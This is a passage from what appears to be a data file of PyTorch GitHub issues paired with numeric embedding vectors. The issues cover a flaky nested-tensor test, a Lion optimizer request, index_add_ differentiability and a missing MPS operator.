  1.65745124e-01 -2.91548997e-01  9.09193009e-02  5.44498488e-02
  3.89303863e-02 -4.76417691e-02 -9.52442139e-02  8.20012838e-02]"
DISABLED test_nested_tensor_chunk_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_chunk_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17941971978).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_chunk_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

ResponseTimeoutError: Response timeout for 5000ms, GET https://raw.githubusercontent.com/pytorch/pytorch/main/test/test_nestedtensor.py -1 (connected: true, keepalive socket: false, socketHandledRequests: 1, socketHandledResponses: 0)
headers: {}

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.64079893e-01 -4.08740751e-02 -2.67023206e-01  1.73601173e-02
  4.33634073e-02 -4.94764805e-01  1.03722319e-01  1.28865808e-01
 -2.56266922e-01 -2.82063514e-01  2.18947366e-01 -2.94771284e-01
  4.32126559e-02  4.49550822e-02 -3.92896682e-02 -1.12485424e-01
 -2.04130054e-01 -1.54209405e-01  3.91429484e-01  5.74896149e-02
 -2.32028991e-01  9.60242003e-04 -3.56626540e-01  2.97880054e-01
  2.62464970e-01  4.68685478e-02 -1.60147250e-01 -3.62448394e-02
  1.84020936e-01  1.16626564e-02  4.35063511e-01  8.23289305e-02
 -2.28185281e-01  3.55003960e-02  4.44958031e-01  2.38180563e-01
 -4.80567738e-02 -1.10451281e-01 -2.53435940e-01 -2.23975092e-01
  2.26605445e-01  8.93632025e-02  1.46445215e-01 -1.88764632e-01
  2.59757578e-01  4.99488153e-02 -1.49620816e-01  1.06901407e-01
 -2.22241297e-01 -8.16898048e-02  8.98389369e-02 -1.29888758e-01
 -1.13731727e-01 -4.10764456e-01 -1.71959493e-03 -1.84119508e-01
  2.56395251e-01  2.48307467e-01  5.74781485e-02  1.67081222e-01
 -1.98807567e-04  1.09087154e-02  1.82581432e-02 -6.06839880e-02
 -6.43348321e-02  5.49053550e-02  2.55339921e-01 -2.52264440e-01
  4.88221645e-01 -2.88587846e-02  2.59336412e-01 -3.00609302e-02
 -4.12059426e-01 -1.09209502e-02  1.92381009e-01  2.87574559e-01
 -1.03315033e-01  1.00809023e-01  2.69773211e-02 -3.87019031e-02
 -3.01474094e-01 -8.75645224e-03  1.37992308e-01 -1.08349465e-01
  1.81729406e-01  4.20314483e-02  2.05716044e-01  4.81491089e-02
  2.05723405e-01 -3.01981747e-01  2.72227585e-01  3.07805598e-01
 -1.91931427e-01  2.09215954e-02 -1.10882752e-01  1.78899709e-02
  3.90088618e-01 -7.80336484e-02 -2.39510223e-01  1.73627943e-01
  6.79584816e-02 -2.90874571e-01 -1.00765668e-01  3.64194423e-01
 -1.55666143e-01 -8.19567069e-02  3.46570313e-01  1.92450806e-02
  7.67415985e-02 -1.89108267e-01  2.19386876e-01 -3.96728143e-02
  2.01338291e-01  2.42736444e-01  1.51278734e-01 -1.29797369e-01
 -1.87818885e-01 -1.15742236e-01 -4.08145711e-02  5.68261445e-01
 -3.51981044e-01 -4.90776300e-02  1.38163775e-01 -4.93770931e-04
  2.74668455e-01  4.55520675e-02 -6.00452274e-02 -3.31167132e-04
  1.67683631e-01 -1.11133635e-01 -4.27281950e-03  9.01756063e-02
 -2.36110449e-01 -1.56895712e-01  9.04849768e-02  1.04584701e-01
 -2.06139684e-01 -1.75002113e-01  1.65246371e-02  5.20844907e-02
 -1.24884911e-01  1.40358046e-01  2.03027427e-02 -2.76194990e-01
  3.06757569e-01  5.50700016e-02 -2.39977449e-01  1.22851565e-01
 -1.36060655e-01  9.17936936e-02  2.84833834e-02  1.12213388e-01
  2.15293437e-01  3.56049210e-01 -8.00475851e-03  8.09163228e-02
  2.72456765e-01  1.64501041e-01 -5.58846891e-02 -2.23467261e-01
 -4.71223369e-02  4.62346703e-01 -1.48066357e-01  2.16466673e-02
  2.59196043e-01 -4.28229570e-02 -5.44531822e-01  1.42549975e-02
  1.01872385e-01  2.04789460e-01 -1.18363544e-01 -5.71469143e-02
  4.00220975e-02  7.28095174e-02  6.81038946e-02 -4.40095179e-02
  2.34864414e-01 -3.98587227e-01 -1.05745688e-01  2.84145474e-01
  1.03033736e-01  1.29257813e-02  1.34784415e-01  1.07673012e-01
 -3.99870276e-02  9.04078931e-02  3.05033624e-01 -5.07097915e-02
  7.02351406e-02  4.38370109e-02 -4.33191061e-01 -1.59562379e-01
  7.28099942e-02 -9.83238369e-02 -1.43879846e-01 -9.93442461e-02
  1.00075856e-01 -1.73749387e-01  2.18134429e-02  1.25739146e-02
 -1.13512307e-01  1.51754603e-01  1.39647305e-01 -1.08232960e-01
  1.55190080e-01 -6.05594479e-02 -1.78332776e-01 -3.37620318e-01
  1.25757098e-01  1.19029090e-01 -1.12001851e-01 -3.29192162e-01
 -2.07970142e-01 -2.27595210e-01  5.39103597e-02 -1.46925062e-01
 -9.25559737e-03 -1.31593615e-01 -2.94832170e-01  2.70108670e-01
 -1.14985622e-01 -1.53763086e-01 -2.66035974e-01 -1.62050694e-01
 -3.21454108e-01 -2.11111903e-01 -2.07178205e-01  1.51199549e-01
 -3.57248746e-02  6.65202737e-02 -2.74798255e-02 -1.18761569e-01
  7.55117387e-02 -1.47669129e-02  3.27621698e-01 -2.79312849e-01
 -3.84610385e-01 -1.38704836e-01  5.01616001e-02  4.50028390e-01
 -5.27732253e-01 -5.30032456e-01 -4.10729721e-02  2.01865137e-01
  6.88695442e-03 -8.88480246e-03 -3.99030000e-03 -3.19842473e-02
 -2.18527585e-01  1.69324785e-01 -2.36392185e-01 -3.49748552e-01
  2.45436639e-01  4.44254875e-02  1.47654772e-01  3.45280290e-01
 -8.07342380e-02  4.96858396e-02  6.09513745e-02 -1.05466202e-01
  9.99557376e-02  2.77199626e-01 -1.61331847e-01  3.13086927e-01
  9.16379616e-02  2.55898774e-01 -3.22161525e-01  2.74050266e-01
  5.89390583e-02 -9.71916988e-02  3.60392928e-01 -3.22964489e-01
 -7.66472518e-03 -7.72299524e-03  2.11618483e-01 -2.43328780e-01
  4.32375461e-01  2.93600529e-01 -1.41837269e-01 -1.03838213e-01
  3.08118761e-01  1.32831380e-01 -2.46053532e-01 -4.60126176e-02
  5.22921570e-02 -2.97408164e-01 -2.10765913e-01 -1.81397200e-01
 -2.15695024e-01 -4.86800894e-02 -2.03184426e-01  1.91355616e-01
 -1.78896636e-03 -3.72260176e-02 -4.12032872e-01  3.23060304e-02
  3.71862888e-01 -2.25585371e-01  3.05975750e-02 -9.60571915e-02
 -1.23912454e-01 -6.15003444e-02  1.79055914e-01 -3.00514996e-01
  9.17807072e-02 -3.29827964e-02  2.98315078e-01  6.60078302e-02
  3.73436779e-01 -3.74885440e-01  8.09941292e-02  1.69645712e-01
 -6.08433783e-02  3.00012231e-01  6.94847852e-03 -7.50444606e-02
 -1.15411207e-01  5.03973961e-01  1.74721256e-01  1.64574698e-01
  3.10297996e-01 -2.51448900e-01 -2.93594003e-01  1.70586497e-01
  6.81612641e-02 -1.71758160e-01 -2.85226852e-01 -9.47762430e-02
 -1.24176435e-01  3.31612825e-02 -1.64166853e-01 -2.98501551e-01
 -2.41950288e-01 -1.04299337e-01 -8.05137828e-02 -9.75493640e-02
 -9.67169777e-02  4.28923517e-01 -1.98222585e-02 -2.16017455e-01
  4.94636893e-02 -1.33429185e-01  1.12565622e-01 -3.77413005e-01
 -9.78150815e-02 -1.11990437e-01  2.21445590e-01  2.08122581e-01
  1.44342601e-01  6.43582419e-02 -1.43705577e-01  6.82168454e-02
 -2.78647959e-01 -6.82826638e-02  2.86918670e-01  4.75732267e-01
 -4.04194929e-03  8.43289196e-02  3.05201769e-01  5.01217127e-01
 -2.39329800e-01 -3.12883854e-02 -2.98410416e-01 -3.56279731e-01
  3.02146137e-01 -1.26211807e-01 -1.86247230e-01 -3.02873384e-02
  1.60686851e-01  2.74158329e-01 -3.82432282e-01  2.83647776e-01
 -1.20544404e-01  3.49655330e-01  2.31645390e-01 -9.99847576e-02
  6.82863146e-02 -1.29819691e-01  1.28054377e-02 -8.92928839e-02
  7.52047002e-02  1.42284125e-01  8.56627971e-02  1.01415999e-01]"
Implementation of Lion Optimizer. feature module: optimizer triaged,"### ðŸš€ The feature, motivation and pitch

Lion Optimizer is becoming a great alterative to AdamW and Adam Optimizer. It is more efficient as it does not use second order moments and instead uses sign operations in order to update the weights. This saves on memory and decreases training time. In  some cases it is better than Adam and AdamW as given in the paper.
The original paper for this is : https://arxiv.org/pdf/2302.06675.pdf

The RFCS PR for this is: https://github.com/pytorch/rfcs/pull/60

### Alternatives

_No response_

### Additional context

_No response_

cc @vincentqb @jbschlosser @albanD @janeyx99 @crcrpar",False,"[-1.55818596e-01  1.64236844e-01 -1.76230043e-01 -2.54955530e-01
  8.99942219e-02 -2.66001187e-02 -4.30868752e-03  1.15090534e-01
 -3.67770940e-01  1.19318053e-01  7.66311958e-02  2.79222637e-01
  1.24968193e-01  4.30524871e-02  9.26365182e-02 -3.37299518e-02
  7.84141570e-02  2.73515314e-01 -3.17332894e-01 -3.84639889e-01
  6.89537823e-02 -1.44506142e-01  2.11350266e-02  1.88952708e-03
  3.93987969e-02 -5.92268854e-02 -1.15786240e-01 -1.68328911e-01
  1.13119334e-01 -2.05149263e-01  1.32677495e-01  6.08060844e-02
  2.53543794e-01 -2.48994544e-01 -3.52085382e-01  1.12499021e-01
 -1.25681326e-01 -1.80611134e-01 -1.22065835e-01  2.57012583e-02
 -1.37175038e-01  4.30152491e-02  8.90756696e-02  3.42643447e-03
 -1.92285746e-01  1.86908841e-01 -2.97070444e-01  7.81049654e-02
 -1.01105727e-01  6.98260590e-02 -1.32440776e-02  1.41315579e-01
 -1.11914262e-01 -5.74800849e-01 -1.11715958e-01  2.45918334e-01
 -7.90592004e-03  1.23833418e-01  2.11584926e-01 -3.32716197e-01
  3.98091316e-01 -3.34152132e-02 -7.18935430e-02  2.41604239e-01
  2.74846792e-01 -2.38024682e-01 -7.92633444e-02 -6.78049996e-02
 -1.57243423e-02  1.92305565e-01  1.34133399e-01 -1.02912441e-01
 -1.47892296e-01 -1.93507016e-01  9.43009257e-02  4.99369018e-02
 -2.74050593e-01 -2.92874128e-03  3.56336944e-02 -1.09170422e-01
  4.05975133e-02 -1.11386068e-01 -2.56639600e-01 -8.32089782e-02
  2.74148941e-01  8.03782418e-02  1.91642150e-01 -2.82569319e-01
  2.16544941e-01  1.14501894e-01  1.07298858e-01 -9.23141688e-02
  1.25301689e-01 -1.68687780e-04  4.02106225e-01  1.98844969e-01
  7.50288814e-02 -1.29443884e-01 -4.30242240e-01  5.99388555e-02
 -8.54969993e-02 -2.47405171e-02 -3.74181777e-01 -2.76710130e-02
 -2.05980554e-01 -3.83021146e-01 -1.43286631e-01  5.76334409e-02
  1.93922579e-01  2.42600814e-01  8.57010484e-02 -1.93613723e-01
  5.70379794e-02  3.03132117e-01 -5.63887088e-03  3.07131380e-01
 -1.21647537e-01 -4.58373949e-02  2.69138813e-01  1.18861943e-01
  2.88323998e-01 -1.91748112e-01 -8.64736829e-03  3.71189773e-01
  1.31501913e-01 -3.91530208e-02 -6.62996471e-02  1.55401900e-02
 -2.61753738e-01  3.65385748e-02  1.73643783e-01 -1.38640866e-01
 -7.13406056e-02 -1.48436934e-01 -8.19724798e-02 -3.10871024e-02
  3.39450017e-02 -7.68251121e-02 -2.45319635e-01  1.33005261e-01
 -1.47600099e-01  4.78114843e-01 -2.60331750e-01 -3.12386334e-01
 -8.45680237e-02  3.69710326e-01 -1.05661884e-01  1.25142336e-01
  2.88708657e-01 -3.19272578e-01 -1.23151176e-01  1.91142395e-01
 -2.41787862e-02  2.92231381e-01  1.54226974e-01  2.04655305e-01
  1.26429453e-01  1.48237199e-01  6.84866905e-02 -7.80515522e-02
  9.37943757e-02  2.29165763e-01  2.57642090e-01 -3.26435715e-01
  1.47026330e-01 -1.18528210e-01 -9.05839503e-02 -1.51410550e-01
 -4.13421243e-02  2.57431209e-01 -1.30835727e-01 -1.78160220e-01
 -3.63851786e-02  7.54851252e-02  3.95284951e-01 -6.28379434e-02
  1.74205378e-03 -1.38674185e-01  4.64260019e-02  3.58067930e-01
  4.78169352e-01 -4.85781170e-02  3.36131841e-01  1.31062075e-01
 -1.71084523e-01  1.65019989e-01  1.95201293e-01 -6.28858432e-03
 -2.29998052e-01  1.00349426e-01  2.81756036e-02 -1.38865381e-01
  6.69417717e-03  8.21683854e-02 -8.21557194e-02 -2.66512007e-01
  2.31031299e-01  6.78070039e-02  3.15742381e-02  1.26365006e-01
 -2.02622622e-01 -1.02126691e-02 -1.92552023e-02 -4.15618598e-01
  8.56950134e-02  4.63761836e-02 -8.38532895e-02 -3.93781811e-01
 -1.52167320e-01  1.91329136e-01 -1.94809556e-01 -3.71137708e-01
  1.45917043e-01 -2.32344151e-01 -1.10285521e-01 -3.19946632e-02
  1.66992079e-02  1.51335880e-01  5.41691557e-02 -6.00093231e-03
 -3.15215252e-03 -3.05376798e-02  1.28539234e-01 -3.06581438e-01
 -8.06960538e-02 -1.36230558e-01 -5.76220527e-02 -1.22676663e-01
 -8.83545727e-06  8.71422142e-02 -8.69162902e-02 -2.88849086e-01
  2.18708545e-01 -1.52387530e-01 -2.43706807e-01  2.67178789e-02
 -2.58454774e-02 -5.82243837e-02 -3.42419818e-02 -3.01421821e-01
  1.83038458e-01 -1.43704474e-01 -6.18204437e-02 -7.03992844e-02
  6.15634859e-01  3.37447822e-02 -9.17953178e-02 -1.72007665e-01
  3.47173885e-02 -1.90137755e-02 -1.92056432e-01  5.21602035e-02
  3.61134931e-02 -1.42823368e-01 -2.37623468e-01  1.16958231e-01
 -2.21670464e-01  1.52000654e-02  4.30351533e-02  1.49901286e-02
  2.56773800e-01  2.49401674e-01 -1.98518246e-01  2.86961317e-01
  3.52983326e-01 -3.09915133e-02 -2.04270080e-01 -4.46976051e-02
  1.05201632e-01  2.61395909e-02  1.72829911e-01 -2.36182928e-01
  2.87473854e-02 -4.00816798e-02  2.23648161e-01  3.13630663e-02
  3.03430378e-01 -2.59050965e-01 -1.29313096e-01 -3.07037711e-01
  7.03707039e-02 -3.19007546e-01 -5.30382544e-02  1.70400530e-01
 -1.85231999e-01 -2.88574934e-01 -1.12161860e-02  3.21864858e-02
 -1.66924179e-01 -7.26028681e-02 -2.67637551e-01  2.78166384e-01
  1.48069868e-02  4.26754691e-02  6.29027188e-02  1.33096978e-01
  1.15461871e-01  2.97899656e-02 -2.51108468e-01 -2.58188486e-01
  1.97373599e-01  1.07557915e-01  1.93840802e-01 -1.54549405e-01
 -4.05587137e-01 -9.53839272e-02  2.62596846e-01  5.25151379e-04
  2.54295707e-01  4.19503674e-02 -1.26254439e-01  2.10144401e-01
 -5.47351539e-02  4.73656386e-01 -2.70470321e-01  1.90928519e-01
 -6.18886203e-03  3.72892141e-01 -9.18190479e-02  1.09764151e-01
 -9.91335139e-02 -2.76533097e-01 -2.02253312e-01  1.63762942e-01
  1.76167861e-02  3.79503131e-01 -4.46052730e-01 -2.08615139e-01
 -1.48014307e-01 -3.11737418e-01  3.59963775e-01  1.85537219e-01
  1.39837518e-01  1.59062997e-01  1.85315058e-01  1.29811957e-01
  7.57839084e-02  3.88117313e-01 -1.72810003e-01 -1.14257485e-01
  8.67690705e-03  3.08110654e-01  8.21306184e-02 -3.72777700e-01
 -2.29610339e-01  6.10557478e-03  1.63822740e-01  3.54097843e-01
 -1.85680613e-01  1.29887626e-01 -2.01239839e-01  4.33136642e-01
  3.42503190e-02 -1.64424419e-01  3.97585094e-01 -2.03569941e-02
  1.14303157e-01  1.13497198e-01 -5.91973178e-02 -1.90729409e-01
 -1.21702403e-01  3.70697439e-01 -6.05177045e-01  3.58131111e-01
  1.43172070e-01 -5.30145466e-02  1.34659916e-01 -8.19540620e-02
  8.57777148e-03  5.96674383e-02 -2.37422451e-01  4.07484233e-01
 -7.67617580e-03 -5.42949187e-03  2.03915894e-01 -2.21623987e-01
  1.38625503e-01 -6.57731816e-02  9.13403332e-02  3.11910838e-01
  1.34810045e-01  4.17030901e-02 -1.15488485e-01  8.50461796e-02]"
Is the index_add_ function differentiable? ,"### ðŸš€ The feature, motivation and pitch

```python
        verts_normals = torch.zeros_like(cornea_vertex)
        vertices_faces = cornea_vertex[face_index]

        faces_normals = torch.cross(
            vertices_faces[:, 2] - vertices_faces[:, 1],
            vertices_faces[:, 0] - vertices_faces[:, 1],
            dim=-1,
        )
        unit_faces_normals = safe_normalize(faces_normals)
        verts_normals.index_add_(0, face_index[:, 0], unit_faces_normals)
        verts_normals.index_add_(0, face_index[:, 1], unit_faces_normals)
        verts_normals.index_add_(0, face_index[:, 2], unit_faces_normals)
```
### Alternatives

_No response_

### Additional context

_No response_
```[tasklist]
### Tasks
```
",False,"[-1.62988186e-01 -8.81758984e-03 -9.07800049e-02  2.37071097e-01
 -9.27458890e-03  6.07983917e-02  4.16197240e-01  9.67051610e-02
 -4.20850158e-01  2.21008100e-02 -1.14576481e-01 -2.27451593e-01
  4.02736753e-01  1.23485774e-01 -1.31523460e-01  3.20811808e-01
 -2.40594409e-02 -1.53072447e-01 -1.30442739e-01 -3.78750265e-02
  2.97248363e-01 -2.67253399e-01  1.11157939e-01 -2.91425407e-01
 -1.23559698e-01 -1.28053024e-01 -1.11416042e-01  3.27142358e-01
  5.22922754e-01 -4.83989194e-02 -6.61231279e-02 -2.93283224e-01
 -2.83710182e-01  9.74692479e-02 -1.38923824e-02 -1.08492211e-01
 -4.52538311e-01  1.25562131e-01 -3.55035216e-01  6.94778562e-02
 -6.95357565e-04  3.03023215e-02  1.47903278e-01  1.54838651e-01
  1.05473906e-01  3.05668056e-01 -2.43501022e-01  1.43429160e-01
 -1.47003785e-01 -1.27594858e-01 -3.72315049e-02 -1.27767488e-01
 -3.80654067e-01 -3.27462368e-02  8.14975649e-02 -3.75012219e-01
 -4.03367430e-01 -2.10437149e-01  1.51809379e-01 -5.13797820e-01
  1.63225904e-01 -1.78522356e-02  5.24944663e-02  2.64891386e-01
  1.17268749e-01  8.20063651e-02 -2.71729141e-01  1.84236258e-01
  2.28143543e-01  3.07899326e-01  2.80390024e-01  2.92793840e-01
 -3.59493613e-01 -2.83838093e-01 -7.34559000e-02 -8.40503573e-02
 -2.71758378e-01  3.63564026e-03 -3.71261775e-01 -1.80572331e-01
 -6.66452423e-02 -2.13706702e-01 -3.71735841e-02  1.11676186e-01
 -6.08573183e-02  3.09098251e-02  3.46641153e-01 -7.30653331e-02
 -1.84955448e-02 -5.66142164e-02  3.99640530e-01  4.26282108e-01
 -2.69910276e-01  1.50987893e-01  4.68542576e-01  2.88446784e-01
  3.55274379e-01 -1.35931838e-02 -1.05859280e-01  2.14796722e-01
 -6.66319206e-02 -5.12333632e-01 -1.27816409e-01  3.00749958e-01
  2.26076230e-01  8.39595683e-03  9.86500457e-03  3.94936763e-02
 -1.06557541e-01  3.20515931e-01  1.03200324e-01 -1.88351244e-01
  1.90300688e-01  3.19823384e-01  1.60906818e-02 -6.74159169e-01
 -2.01018393e-01  4.00017686e-02  2.48133525e-01  2.98757255e-01
  2.83201337e-01  3.68914604e-01  3.04953754e-01  7.23432973e-02
  5.67441523e-01  3.18724126e-01  1.16065875e-01  5.40426150e-02
 -4.47393566e-01  8.96595493e-02 -6.42754436e-02  1.26018345e-01
  1.37717696e-02  2.13441327e-01 -7.93723017e-02  7.47195855e-02
 -3.72696593e-02  4.36981201e-01 -8.61915350e-02  2.73852348e-01
 -4.34896350e-01  3.79107893e-01 -1.35110229e-01 -7.83894584e-02
  3.04192662e-01 -8.13061371e-02 -6.16132021e-01 -2.74929460e-02
 -2.25814916e-02  1.13591723e-01  1.30221874e-01 -1.13655612e-01
 -5.74196398e-01  9.36686173e-02  8.88316184e-02 -1.50847092e-01
 -3.89227867e-01  3.57931107e-03  3.17655474e-01 -3.46136630e-01
  1.57379836e-01  3.73782255e-02 -9.47713926e-02  3.79882097e-01
  2.27579385e-01  1.43517956e-01 -1.44319206e-01 -4.36719581e-02
 -3.18136781e-01  1.75729617e-01  1.07316561e-01 -1.73689723e-01
 -3.38119306e-02  2.95962512e-01  2.45256409e-01 -1.73246264e-01
 -4.31188196e-01 -5.36358714e-01 -4.88283038e-01  1.44294605e-01
  7.66349494e-01  4.95806374e-02 -5.06888032e-02 -3.51377092e-02
 -1.46137297e-01  1.84335113e-01  2.04142630e-02  1.72314674e-01
  3.33514959e-02 -3.51926416e-01 -1.69653147e-01 -4.12762940e-01
  1.80603027e-01  2.33563051e-01  1.03708498e-01 -2.56146919e-02
  1.62648648e-01 -5.28381586e-01  9.18325260e-02  1.20121598e-01
 -2.60304362e-01 -2.56384939e-01 -1.80384994e-01 -2.73207486e-01
  4.07937378e-01  2.02902883e-01 -2.13697344e-01 -3.09527755e-01
  2.65776422e-02  2.20263302e-01 -5.85126877e-01 -3.36365402e-01
  1.53485406e-03 -4.70289350e-01 -5.35009168e-02  3.15335616e-02
 -1.69905916e-01  2.58355409e-01 -3.01034570e-01  4.11039963e-02
  1.10594593e-01  2.99537361e-01 -1.76825583e-01 -5.03023267e-01
 -5.58174074e-01  4.54886317e-01 -2.85880864e-01  1.67810172e-01
 -9.87824798e-02  2.98906360e-02  2.89657354e-01 -9.28347111e-02
  7.15086579e-01  1.10993773e-01  9.41984802e-02  3.85435998e-01
 -8.86183530e-02 -2.90584296e-01 -8.72992650e-02  2.87473798e-01
 -1.63215339e-01  3.62384506e-02 -7.61105567e-02 -4.42464173e-01
 -2.16466874e-01  4.48655695e-01 -5.05831122e-01 -7.80292898e-02
 -6.21820092e-02  6.46192014e-01 -3.37895930e-01 -2.01669097e-01
 -2.27282107e-01 -1.20096132e-01  1.91338390e-01  1.16723925e-01
  2.40673691e-01  2.81851083e-01 -1.06345609e-01 -1.33933008e-01
 -2.16321275e-02 -1.28314584e-01  8.93079638e-02  4.73985821e-01
  4.39772278e-01  1.11380257e-02 -3.66264343e-01  6.96321368e-01
 -2.79172771e-02  1.04042798e-01 -4.89608720e-02 -7.23729968e-01
  3.89166713e-01 -2.22714067e-01 -1.29771188e-01 -1.07207701e-01
  2.05110997e-01  2.43758019e-02  8.99037793e-02 -1.88058496e-01
  1.26121193e-01 -2.15695538e-02  1.74301535e-01  2.55376250e-01
 -1.00522283e-02 -1.88840359e-01 -1.00262359e-01  2.93008089e-01
  1.44827008e-01 -3.73823009e-02 -2.60599732e-01 -2.43733793e-01
  2.87597001e-01 -1.80285603e-01 -3.25999200e-01  2.61364460e-01
 -1.86421916e-01 -6.48479223e-01 -1.74009264e-01  3.55513990e-01
  3.27461630e-01  4.92145687e-01  1.03679091e-01 -1.55057847e-01
 -6.62484527e-01  4.43918072e-03  1.97475672e-01  1.56318545e-01
  3.64040464e-01 -1.41061917e-01  3.15044522e-01 -1.93072811e-01
 -2.06432834e-01  2.21443295e-01 -1.73479915e-02  4.85737771e-02
 -3.69039953e-01  2.62975037e-01  1.69480503e-01 -4.99093458e-02
 -7.47600570e-03 -4.37730879e-01 -2.65457869e-01  1.01968050e-01
  7.41949230e-02 -1.64034382e-01 -4.54752743e-02 -1.81080714e-01
 -3.35022748e-01  1.31916195e-01  2.31846109e-01 -4.90864553e-02
  2.10266307e-01 -9.01374891e-02  1.96309090e-01  2.67314799e-02
 -4.23762143e-01  4.10970896e-01 -2.43695870e-01 -2.45869026e-01
 -1.03968754e-01 -1.67499080e-01  4.89435531e-02 -2.79011428e-01
 -2.63168335e-01 -3.10232580e-01  1.39181226e-01  1.15566701e-01
 -1.00044206e-01  2.71699950e-02  5.24450421e-01  2.77449489e-02
  3.95010971e-03  3.90080690e-01  3.07504296e-01  2.69456282e-02
  1.71398133e-01 -1.20308407e-01 -1.58745453e-01  4.24922109e-01
 -2.14071319e-01 -6.56536445e-02  1.71152040e-01 -7.36955255e-02
 -1.84380904e-01  1.62853032e-01  2.08638489e-01  3.28649282e-01
  2.45633602e-01  1.33905590e-01  1.43390715e-01  2.13637590e-01
 -9.53899249e-02  4.16461825e-01  2.08014891e-01 -1.63778350e-01
  1.45671576e-01  3.35065663e-01  3.36745948e-01  1.48184195e-01
  7.42667988e-02  1.87851876e-01 -4.19788420e-01  6.88603893e-02]"
Not Implemented Issue needs reproduction module: mps,"### ðŸš€ The feature, motivation and pitch

NotImplementedError: The operator 'aten::_unique2' is not currently implemented for the MPS device. If you want this op to be added in priority during the prototype phase of this feature, please comment on https://github.com/pytorch/pytorch/issues/77764. As a temporary fix, you can set the environment variable `PYTORCH_ENABLE_MPS_FALLBACK=1` to use the CPU as a fallback for this op. WARNING: this will be slower than running natively on MPS.

### Alternatives

Please add this

### Additional context

_No response_

cc @kulinseth @albanD @malfet @DenisVieriu97 @razarmehr @abhudev",False,"[-2.07789212e-01  8.98922235e-02 -1.24572061e-01 -6.04455657e-02
 -5.55992946e-02 -1.95811778e-01 -2.24045739e-01 -3.87589037e-02
 -3.11090052e-01 -1.08414173e-01  2.38384739e-01  3.51175945e-03
 -1.48233861e-01  5.55269346e-02  2.19812095e-01  1.55742645e-01
 -1.36334121e-01 -5.54391518e-02  1.70538306e-01  1.97487354e-01
  7.54612088e-02  8.09232593e-02 -9.51879323e-02 -2.07996070e-01
 -1.31684422e-01 -9.41420346e-02 -4.91235331e-02  1.15393639e-01
  2.10173056e-01  1.16221778e-01  3.25530261e-01  1.11936152e-01
 -5.96271716e-02 -1.81476116e-01  1.66476429e-01  1.62826721e-02
 -1.64576903e-01 -2.01799825e-01 -1.53999686e-01 -1.56476408e-01
 -3.24113071e-02  1.96503699e-01  5.97137138e-02 -4.63602580e-02
 -3.07635605e-01 -3.73958126e-02 -4.09385562e-02  7.03132227e-02
 -3.30849588e-01 -5.29934131e-02 -1.88927725e-01 -2.55762935e-01
 -2.63125122e-01 -4.36644346e-01 -2.29078420e-02 -1.13354459e-01
  7.80631304e-02  2.77095795e-01 -5.20520359e-02 -8.50858986e-02
  2.29657590e-01 -2.24592477e-01 -1.55001894e-01  8.19079876e-02
 -1.52343392e-01  2.46784508e-01 -7.73229674e-02 -7.83486515e-02
  3.10460627e-01 -1.05107345e-01  7.49635771e-02 -4.88523357e-02
 -2.39642411e-01 -1.97215289e-01  5.29360995e-02  5.25775086e-03
 -3.32356572e-01  2.82364726e-01 -8.98488536e-02 -9.49970782e-02
 -9.33877081e-02 -1.81936353e-01 -2.78688073e-01 -1.22736119e-01
  7.88308382e-02  6.32930622e-02  7.31485263e-02 -7.11657330e-02
 -1.23220257e-01 -1.33457303e-01  1.32209927e-01 -5.20548224e-02
  1.34391785e-01  2.28422105e-01  2.66780585e-01  3.97247612e-01
  4.25551943e-02 -8.46116245e-03 -1.03094801e-01 -2.45131388e-01
 -2.77488381e-01 -3.81548882e-01 -3.43486547e-01  4.33176070e-01
 -2.18762815e-01 -3.36940348e-01 -1.29806370e-01  7.00346678e-02
  2.23366886e-01 -1.58856198e-01  9.34789926e-02 -8.32323078e-03
  4.40441258e-02  7.61493444e-02 -4.50270697e-02  1.03018552e-01
 -2.74462663e-02 -1.81690931e-01 -3.70598622e-02  1.18796945e-01
  1.35257497e-01 -1.33728266e-01 -5.19661829e-02  1.17077544e-01
  4.02843177e-01 -6.64280057e-02 -1.92392796e-01  1.41638070e-01
 -5.63971475e-02 -2.36243214e-02  3.41811031e-01 -7.11772144e-02
  2.49116570e-01 -1.78818598e-01  2.97511607e-01 -1.41480327e-01
 -8.89463201e-02 -3.77369642e-01 -2.92589758e-02 -1.84260786e-01
 -9.85321999e-02  1.10602677e-01  6.08827211e-02 -4.40578222e-01
 -1.22813128e-01  3.24717104e-01  6.47380948e-02  2.55339742e-01
 -1.20876916e-02  4.91537564e-02  2.45797541e-03 -2.52108723e-02
 -5.96456267e-02  5.10152996e-01  2.25416303e-01  5.27280085e-02
  2.64133513e-03  9.71338898e-02  6.31748959e-02 -3.22988987e-01
 -1.16125457e-01  3.06492895e-01  5.26468381e-02 -1.00287408e-01
 -1.40462816e-01  5.93198985e-02 -2.62145877e-01 -8.18648636e-02
  1.21095598e-01 -2.50329562e-02 -3.00986797e-01  1.58941180e-01
  1.43911958e-01 -4.52818036e-01  3.27892184e-01  3.85580957e-02
  3.00521076e-01 -2.90311903e-01 -4.30386774e-02  3.28032315e-01
  3.01130325e-01  1.24933019e-01  2.71599472e-01 -9.68172774e-02
  6.65747598e-02  4.87607382e-02  1.22005887e-01 -1.19012281e-01
  1.01288766e-01 -1.81610197e-01 -3.68934944e-02 -8.68772119e-02
  2.28897125e-01 -9.30891782e-02  1.72810912e-01 -3.20147216e-01
 -4.62930426e-02  6.17854558e-02  1.16437390e-01 -8.02554861e-02
  1.22460708e-01  4.80897091e-02  3.53264436e-03  8.85821804e-02
  6.26368299e-02 -4.51171622e-02 -8.89427140e-02 -1.30983055e-01
 -1.28770113e-01  2.42442444e-01 -3.45165104e-01 -2.98289955e-01
  3.49084735e-02 -1.93620294e-01 -3.03939939e-01  2.72295922e-01
  3.25256772e-02  1.59900516e-01  1.29230440e-01 -1.86029729e-02
